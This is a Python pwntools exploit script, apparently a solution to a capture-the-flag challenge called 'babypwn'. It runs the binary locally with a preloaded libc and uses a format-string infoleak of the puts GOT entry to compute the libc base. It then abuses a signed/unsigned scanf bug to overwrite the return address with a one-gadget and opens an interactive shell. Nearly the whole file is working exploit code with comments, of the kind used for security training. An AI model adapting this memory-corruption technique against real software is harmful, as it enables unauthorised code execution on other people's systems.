# This exploit is based off of: https://devel0pment.de/?p=1191

from pwn import *

# Estbalish the target, the enviornment, and the libc file
target = process('./babypwn', env = {'LD_PRELOAD':'./libc'})
elf = ELF('libc')
gdb.attach(target, gdbscript='b *0x40084e')

# This is just a function to hande the IO for the start
def start(name, coins):
    print target.recvline()
    target.sendline('y')
    print target.recvuntil("name:")
    target.sendline(name)
    print target.recvuntil("How many coins do you have?")
    target.sendline(str(coins))

# setup the format string infoleak and signed/unsigned bug
start("%8$s", -1)

# 6295472 = 0x600fb0 = got address of puts for puts infoleak
# 0 since top 4 bytes of got address are 0 
target.sendline("6295472")
target.sendline("0")

# Fill the space untill the return address
for i in xrange(24):
    target.sendline('+')

# Set the return address to start, to restart the code
target.sendline("4196112")
target.sendline("0")

# Go through the rest of the scanf calls without writing over anything
for i in xrange(227):
    target.sendline('+')

# Can in the infoleak
target.recvline()
leak = target.recvline()

# Filter it out, calculate the libc base and address of oneshot gadget

leak = leak.replace("Tressure Box: ", "")
leak = leak.replace(" created!", "")
leak = leak.replace("\x0d\x0a", "")

leak = u64(leak + "\x00"*(8 - len(leak)))
libc = leak - elf.symbols['puts']
onegadget = libc + 0x45216

print "puts address  is: " + hex(leak)
print "the libc base is: " + hex(libc)
print "one gadget is:    " + hex(onegadget)

# Go through the initial portion of the program again, don't trigger format string bug
start("15935728", "-1")

# Go through the scanf bugs untill we reach the return address
for i in xrange(26):
    target.sendline('+')

# Overwrite the return address with the oneshot gadget
target.sendline(str((onegadget & 0xffffffff)))
target.sendline(str((onegadget >> 32 )))

# Go through the rest of the scanf calls
for i in xrange(227):
    target.sendline('+')

# Drop to an interactive shell
target.interactive()
